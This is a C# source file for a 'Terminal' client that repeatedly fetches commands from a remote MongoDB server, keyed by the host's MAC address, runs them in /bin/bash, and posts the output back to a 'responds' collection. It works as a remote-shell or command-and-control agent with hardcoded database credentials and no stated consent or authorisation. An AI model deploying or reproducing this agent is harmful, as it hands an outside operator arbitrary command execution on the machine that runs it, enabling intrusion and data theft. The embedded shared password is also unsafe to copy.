using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using MongoDB.Driver;
using MongoDB.Bson;

namespace ProcessAsyncStreamSamples
{
    class Terminal
    {
        // Define static variables shared by class methods.
        private static StringBuilder sendOutput = null;
        private static StringBuilder senderrOutput1 = null;

        public static void CreateTerminalprocess(string databaseip, string databaseport, string mac)
        {
            while (true)
            {
                string inputText = client.infosender.Clientinfosender(mac, databaseip, databaseport);
                if (inputText != null)
                {
                    Process Terminalprocess = new Process();
                    Terminalprocess.StartInfo.FileName = "/bin/bash";
                    Terminalprocess.StartInfo.UseShellExecute = false;
                    Terminalprocess.StartInfo.RedirectStandardOutput = true;
                    Terminalprocess.StartInfo.RedirectStandardError = true;
                    sendOutput = new StringBuilder();
                    senderrOutput1 = new StringBuilder();
                    Terminalprocess.OutputDataReceived += SendOutputHandler;
                    Terminalprocess.ErrorDataReceived += SenderrOutputHandler1;
                    Terminalprocess.StartInfo.RedirectStandardInput = true;
                    Terminalprocess.Start();
                    StreamWriter StreamWriter = Terminalprocess.StandardInput;
                    Terminalprocess.BeginOutputReadLine();
                    Terminalprocess.BeginErrorReadLine();
                    BsonDocument doc = new BsonDocument();
                    while(true)
                    {
                        doc.Add(new BsonElement("name", "client"));
                        doc.Add(new BsonElement("command", inputText));
                        sendOutput.Clear();
                        senderrOutput1.Clear();
                        try
                        {
                            StreamWriter.WriteLine(inputText);

                        }
                        catch
                        {
                            var dbClient = new MongoClient("mongodb://client:client99@" + databaseip + ":" + databaseport + "/admin");
                            ////create collection
                            IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
                            ////creat Mac object
                            var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
                            doc.Add(new BsonElement("respond", "i cant run ur command!"));
                            respondsdatabase.DropCollection(mac);
                            respondscollection.InsertOne(doc);
                            doc.Clear();
                            StreamWriter.Close();
                            Terminalprocess.Kill();
                            Terminalprocess.Close();
                            break;
                        }
                        Thread.Sleep(1500);
                        if (!String.IsNullOrEmpty(sendOutput.ToString()))
                        {
                            doc.Add(new BsonElement("respond", sendOutput.ToString()));

                        }
                        if (!String.IsNullOrEmpty(senderrOutput1.ToString()))
                        {
                            Thread.Sleep(1500);
                            doc.Add(new BsonElement("respond", senderrOutput1.ToString()));
                        }
                        if (String.IsNullOrEmpty(sendOutput.ToString()) && String.IsNullOrEmpty(senderrOutput1.ToString()))
                        {
                            doc.Add(new BsonElement("respond", "ur command havent any output"));
                        }
                        var dbClient1 = new MongoClient("mongodb://client:client99@" + databaseip + ":" + databaseport + "/admin");
                        IMongoDatabase respondsdatabase1 = dbClient1.GetDatabase("responds");
                        var respondscollection1 = respondsdatabase1.GetCollection<BsonDocument>(mac);
                        respondsdatabase1.DropCollection(mac);
                        respondscollection1.InsertOne(doc);
                    }

                }
            }

        }
        private static void SendOutputHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                sendOutput.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
        private static void SenderrOutputHandler1(object sendingProcess,
    DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                senderrOutput1.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
    }
}

